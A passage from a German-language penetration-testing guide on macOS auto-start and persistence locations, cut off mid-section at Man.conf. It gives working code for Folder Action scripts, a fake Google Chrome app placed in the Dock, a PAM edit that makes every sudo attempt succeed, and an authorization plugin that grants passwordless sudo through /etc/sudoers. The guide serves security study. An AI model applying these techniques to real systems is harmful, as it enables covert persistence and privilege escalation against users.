Eine weitere Möglichkeit wäre, die Dateien **`.bash_profile`** und **`.zshenv`** im HOME des Benutzers zu erstellen. Falls der Ordner LaunchAgents bereits existiert, würde diese Technik trotzdem funktionieren.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Nützlich, um sandbox zu bypassen: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen **`at`** ausführen und es muss **aktiviert** sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Sie müssen **`at`** ausführen und es muss **aktiviert** sein

#### **Beschreibung**

`at`-Tasks sind dafür gedacht, **einmalige Aufgaben** zu festgelegten Zeiten auszuführen. Im Gegensatz zu cron jobs werden `at`-Tasks nach der Ausführung automatisch entfernt. Es ist wichtig zu beachten, dass diese Aufgaben Neustarts des Systems überdauern, wodurch sie unter bestimmten Bedingungen potenzielle Sicherheitsbedenken darstellen.

**Standardmäßig** sind sie **deaktiviert**, aber der Benutzer **root** kann **sie** mit folgendem Befehl **aktivieren**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Damit wird in einer Stunde eine Datei erstellt:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Prüfe die Job-Warteschlange mit `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Oben sehen wir zwei geplante Jobs. Wir können die Details des Jobs mit `at -c JOBNUMBER` anzeigen.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> Wenn AT tasks nicht aktiviert sind, werden die erstellten Aufgaben nicht ausgeführt.

Die **Job-Dateien** befinden sich unter `/private/var/at/jobs/`
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Der Dateiname enthält die Warteschlange, die Jobnummer und die Zeit, zu der er ausgeführt werden soll. Zum Beispiel schauen wir uns `a0001a019bdcd2` an.

- `a` - das ist die Warteschlange
- `0001a` - Jobnummer in Hex, `0x1a = 26`
- `019bdcd2` - Zeit in Hex. Sie stellt die seit Epoch vergangenen Minuten dar. `0x019bdcd2` ist `26991826` im Dezimal. Wenn wir es mit 60 multiplizieren, erhalten wir `1619509560`, was GMT: 2021. April 27., Dienstag 7:46:00 entspricht.

Wenn wir die Job-Datei ausgeben, stellen wir fest, dass sie dieselben Informationen enthält, die wir mit `at -c` erhalten haben.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- But you need to be able to call `osascript` with arguments to contact **`System Events`** to be able to configure Folder Actions
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- It has some basic TCC permissions like Desktop, Documents and Downloads

#### Speicherort

- **`/Library/Scripts/Folder Action Scripts`**
- Root-Rechte erforderlich
- **Auslöser**: Zugriff auf den angegebenen Ordner
- **`~/Library/Scripts/Folder Action Scripts`**
- **Auslöser**: Zugriff auf den angegebenen Ordner

#### Beschreibung & Exploitation

Folder Actions sind Skripte, die automatisch durch Änderungen in einem Ordner ausgelöst werden, wie z. B. Hinzufügen oder Entfernen von Elementen oder andere Aktionen wie das Öffnen oder Ändern der Größe des Ordnerfensters. Diese Aktionen können für verschiedene Aufgaben genutzt werden und können auf unterschiedliche Weise ausgelöst werden, z. B. über die Finder-UI oder Terminal-Befehle.

Zum Einrichten von Folder Actions gibt es folgende Optionen:

1. Erstellen eines Folder Action-Workflows mit [Automator](https://support.apple.com/guide/automator/welcome/mac) und als Service installieren.
2. Ein Skript manuell über Folder Actions Setup im Kontextmenü eines Ordners anhängen.
3. Verwenden von OSAScript, um Apple Event-Nachrichten an die `System Events.app` zu senden, um programmatisch eine Folder Action einzurichten.
- Diese Methode ist besonders nützlich, um die Aktion ins System einzubetten und bietet ein Maß an Persistenz.

Das folgende Skript ist ein Beispiel dafür, was von einer Folder Action ausgeführt werden kann:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Um das obige Skript mit Folder Actions verwendbar zu machen, kompilieren Sie es mit:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Nachdem das script kompiliert wurde, richten Sie Folder Actions ein, indem Sie das folgende script ausführen. Dieses script aktiviert Folder Actions global und hängt das zuvor kompilierte script speziell an den Desktop-Ordner an.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Führe das Setup-Skript mit folgendem Befehl aus:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- So implementieren Sie diese persistence über die GUI:

Dies ist das Skript, das ausgeführt wird:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Kompiliere es mit: `osacompile -l JavaScript -o folder.scpt source.js`

Verschiebe es nach:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Then, open the `Folder Actions Setup` app, select the **folder you would like to watch** and select in your case **`folder.scpt`** (in my case I called it output2.scp):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Now, if you open that folder with **Finder**, your script will be executed.

Diese Konfiguration wurde in der **plist** im Pfad **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** im Base64-Format gespeichert.

Versuchen wir nun, diese Persistenz ohne GUI-Zugriff vorzubereiten:

1. **Kopiere `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** nach `/tmp`, um es zu sichern:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Entferne** die Folder Actions, die du gerade gesetzt hast:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Da wir jetzt eine leere Umgebung haben

3. Kopiere die Sicherungsdatei: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Öffne die Folder Actions Setup.app, um diese Konfiguration zu laden: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Und das hat bei mir nicht funktioniert, aber das sind die Anweisungen aus dem writeup:(

### Dock shortcuts

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber du musst eine bösartige Anwendung im System installiert haben
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `~/Library/Preferences/com.apple.dock.plist`
- **Auslöser**: Wenn der Benutzer auf die App im Dock klickt

#### Beschreibung & Exploitation

Alle Anwendungen, die im Dock erscheinen, sind in der plist angegeben: **`~/Library/Preferences/com.apple.dock.plist`**

Es ist möglich, eine **Anwendung hinzuzufügen** einfach mit:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Mit etwas **social engineering** könntest du **zum Beispiel Google Chrome im Dock imitieren** und tatsächlich dein eigenes Skript ausführen:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- Nützlich, um die Sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Eine sehr spezifische Aktion muss stattfinden
- Man landet in einer anderen Sandbox
- TCC-Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/Library/ColorPickers`
- Root-Rechte erforderlich
- Auslöser: Color Picker verwenden
- `~/Library/ColorPickers`
- Auslöser: Color Picker verwenden

#### Beschreibung & Exploit

**Kompiliere ein color picker** Bundle mit deinem Code (du könntest [**dieses zum Beispiel**](https://github.com/viktorstrate/color-picker-plus) verwenden) und füge einen Konstruktor hinzu (wie im [Screen Saver-Abschnitt](macos-auto-start-locations.md#screen-saver)) und kopiere das Bundle nach `~/Library/ColorPickers`.

Dann, wenn der Color Picker ausgelöst wird, solltest du ebenfalls ausgeführt werden.

Beachte, dass das Binary, das deine Library lädt, eine **sehr restriktive Sandbox** hat: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- Nützlich, um die sandbox zu umgehen: **Nein, weil man seine eigene App ausführen muss**
- TCC bypass: ???

#### Location

- Eine spezifische App

#### Description & Exploit

Ein Anwendungsbeispiel mit einer Finder Sync Extension [**ist hier zu finden**](https://github.com/D00MFist/InSync).

Anwendungen können `Finder Sync Extensions` haben. Diese Extension wird in eine Anwendung eingebettet, die ausgeführt wird. Darüber hinaus muss die Extension, damit sie ihren Code ausführen kann, **mit einem gültigen Apple developer certificate signiert sein**, sie muss **sandboxed** sein (obwohl lockere Ausnahmen hinzugefügt werden könnten) und sie muss bei etwas wie registriert sein:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Screen Saver

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du landest in einer normalen application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- `/System/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Screen Saver auswählen
- `/Library/Screen Savers`
- Root erforderlich
- **Trigger**: Screen Saver auswählen
- `~/Library/Screen Savers`
- **Trigger**: Screen Saver auswählen

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Beschreibung & Exploit

Erstelle ein neues Projekt in Xcode und wähle die Vorlage, um einen neuen **Screen Saver** zu generieren. Füge dann deinen Code hinzu, zum Beispiel den folgenden Code, um Logs zu erzeugen.

**Build** it, and copy the `.saver` bundle to **`~/Library/Screen Savers`**. Then, open the Screen Saver GUI and it you just click on it, it should generate a lot of logs:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Beachte, dass sich in den Entitlements des Binaries, das diesen Code lädt (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), **`com.apple.security.app-sandbox`** befindet, weshalb du dich **inside the common application sandbox** befinden wirst.

Bildschirmschoner-Code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Du landest jedoch in einer application sandbox
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- Die sandbox wirkt sehr eingeschränkt

#### Ort

- `~/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight plugin verwaltet wird, wird erstellt.
- `/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight plugin verwaltet wird, wird erstellt.
- Root erforderlich
- `/System/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight plugin verwaltet wird, wird erstellt.
- Root erforderlich
- `Some.app/Contents/Library/Spotlight/`
- **Auslöser**: Eine neue Datei mit einer Erweiterung, die vom Spotlight plugin verwaltet wird, wird erstellt.
- Neue App erforderlich

#### Beschreibung & Ausnutzung

Spotlight ist die in macOS integrierte Suchfunktion, die darauf ausgelegt ist, Benutzern **schnellen und umfassenden Zugriff auf Daten auf ihren Computern** zu ermöglichen.\
Um diese schnelle Suchfunktion zu ermöglichen, pflegt Spotlight eine **proprietäre Datenbank** und erstellt einen Index, indem es **die meisten Dateien parst**, wodurch schnelle Suchen sowohl nach Dateinamen als auch nach deren Inhalt möglich sind.

Der zugrundeliegende Mechanismus von Spotlight umfasst einen zentralen Prozess namens 'mds', was für **'Metadaten-Server'** steht. Dieser Prozess steuert den gesamten Spotlight-Dienst. Ergänzend dazu gibt es mehrere 'mdworker'-Daemons, die verschiedene Wartungsaufgaben übernehmen, wie das Indexieren unterschiedlicher Dateitypen (`ps -ef | grep mdworker`). Diese Aufgaben werden durch Spotlight importer plugins bzw. **".mdimporter bundles"** ermöglicht, die Spotlight befähigen, Inhalte einer Vielzahl von Dateiformaten zu verstehen und zu indexieren.

Die Plugins bzw. **`.mdimporter`**-Bundles befinden sich an den zuvor genannten Orten, und wenn ein neues Bundle erscheint, wird es innerhalb einer Minute geladen (kein Neustart eines Dienstes erforderlich). Diese Bundles müssen angeben, welche **Dateitypen und -erweiterungen sie verwalten können**; auf diese Weise verwendet Spotlight sie, wenn eine neue Datei mit der angegebenen Erweiterung erstellt wird.

Es ist möglich, **alle geladenen `mdimporters`** zu finden, indem man Folgendes ausführt:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Und zum Beispiel wird **/Library/Spotlight/iBooksAuthor.mdimporter** verwendet, um diese Art von Dateien zu parsen (Erweiterungen `.iba` und `.book` unter anderem):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Wenn du die Plist anderer `mdimporter` überprüfst, findest du möglicherweise nicht den Eintrag **`UTTypeConformsTo`**. Das liegt daran, dass dies ein eingebauter _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) ist und keine Erweiterungen angeben muss.
>
> Außerdem haben systemeigene Standard-Plugins immer Vorrang, sodass ein Angreifer nur auf Dateien zugreifen kann, die nicht bereits von Apples eigenen `mdimporters` indexiert werden.

Um deinen eigenen Importer zu erstellen, kannst du mit diesem Projekt beginnen: [https://github.com/megrimm/pd-spotlight-importer] und dann den Namen, die **`CFBundleDocumentTypes`** ändern und **`UTImportedTypeDeclarations`** hinzufügen, damit es die Erweiterung unterstützt, die du unterstützen möchtest, und sie in **`schema.xml`** spiegeln.\
Dann **ändere** den Code der Funktion **`GetMetadataForFile`**, damit dein payload ausgeführt wird, wenn eine Datei mit der verarbeiteten Erweiterung erstellt wird.

Schließlich **baue und kopiere dein neues `.mdimporter`** in einen der vorherigen Orte und du kannst prüfen, ob es geladen wird, indem du die Logs überwachst oder **`mdimport -L`** ausführst.

### ~~Preference Pane~~

> [!CAUTION]
> Es sieht nicht so aus, als würde das noch funktionieren.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- Nützlich, um sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Es erfordert eine spezifische Benutzeraktion
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Beschreibung

Es sieht nicht so aus, als würde das noch funktionieren.

## Root Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und es ermöglichen, etwas einfach auszuführen, indem man es als **root** in eine Datei **schreibt** und/oder andere **merkwürdige Bedingungen** erfordert.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- Nützlich, um sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root erforderlich
- **Auslöser**: Wenn die Zeit gekommen ist
- `/etc/daily.local`, `/etc/weekly.local` oder `/etc/monthly.local`
- Root erforderlich
- **Auslöser**: Wenn die Zeit gekommen ist

#### Beschreibung & Ausnutzung

Die periodic-Skripte (**`/etc/periodic`**) werden aufgrund der in `/System/Library/LaunchDaemons/com.apple.periodic*` konfigurierten **launch daemons** ausgeführt. Beachte, dass Skripte, die in `/etc/periodic/` gespeichert sind, als **Eigentümer der Datei** **ausgeführt** werden, sodass dies nicht für eine mögliche Privilegieneskalation funktioniert.
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
Es gibt weitere periodische Skripte, die ausgeführt werden, wie in **`/etc/defaults/periodic.conf`** angegeben:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
If you manage to write any of the files `/etc/daily.local`, `/etc/weekly.local` or `/etc/monthly.local` it will be **früher oder später ausgeführt**.

> [!WARNING]
> Beachte, dass das periodische Skript als dessen **Eigentümer** ausgeführt wird. Wenn ein normaler Benutzer Eigentümer des Skripts ist, wird es als dieser Benutzer ausgeführt (das kann Privilegieneskalationsangriffe verhindern).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- Nützlich, um sandbox zu bypassen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- Root immer erforderlich

#### Beschreibung & Exploitation

Da PAM stärker auf **persistence** und Malware als auf einfache Ausführung innerhalb von macOS ausgerichtet ist, wird dieser Beitrag keine detaillierte Erklärung liefern. **Lies die Writeups, um diese Technik besser zu verstehen**.

PAM-Module prüfen mit:
```bash
ls -l /etc/pam.d
```
Eine persistence/privilege escalation-Technik, die PAM ausnutzt, ist so einfach wie das Ändern des Moduls /etc/pam.d/sudo, indem am Anfang die folgende Zeile hinzugefügt wird:
```bash
auth       sufficient     pam_permit.so
```
Also wird es **so aussehen**:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Und daher wird jeder Versuch, **`sudo` zu verwenden**, funktionieren.

> [!CAUTION]
> Beachte, dass dieses Verzeichnis durch TCC geschützt ist, daher wird der Benutzer sehr wahrscheinlich zur Gewährung des Zugriffs aufgefordert.

Ein weiteres gutes Beispiel ist su, wo man sehen kann, dass es auch möglich ist, Parameter an die PAM-Module zu übergeben (und man könnte diese Datei auch backdooren):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- Nützlich, um sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Allerdings musst du root sein und zusätzliche Konfigurationen vornehmen
- TCC bypass: ???

#### Location

- `/Library/Security/SecurityAgentPlugins/`
- Root erforderlich
- Es ist außerdem nötig, die authorization database zu konfigurieren, damit das Plugin verwendet wird

#### Description & Exploitation

du kannst ein authorization plugin erstellen, das beim Benutzer-Login ausgeführt wird, um persistence aufrechtzuerhalten. Für mehr Informationen darüber, wie man eines dieser Plugins erstellt, siehe die oben genannten Writeups (und sei vorsichtig: ein schlecht geschriebenes Plugin kann dich aussperren und du musst dein mac aus dem recovery mode säubern).
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**Verschiebe** das bundle an den Ort, von dem es geladen wird:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
Fügen Sie schließlich die **Regel** hinzu, um dieses Plugin zu laden:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
Die **`evaluate-mechanisms`** sagt dem Autorisierungs-Framework, dass es einen externen Mechanismus zur Autorisierung aufrufen muss. Außerdem bewirkt **`privileged`**, dass es als root ausgeführt wird.

Starte es mit:
```bash
security authorize com.asdf.asdf
```
Und dann sollte die **staff group sollte sudo-Zugriff haben** (lies `/etc/sudoers` zur Bestätigung).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- Nützlich, um die sandbox zu umgehen: [🟠](https://emojipedia.org/large-orange-circle)
- Aber du musst root sein und der Benutzer muss man verwenden
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Standort

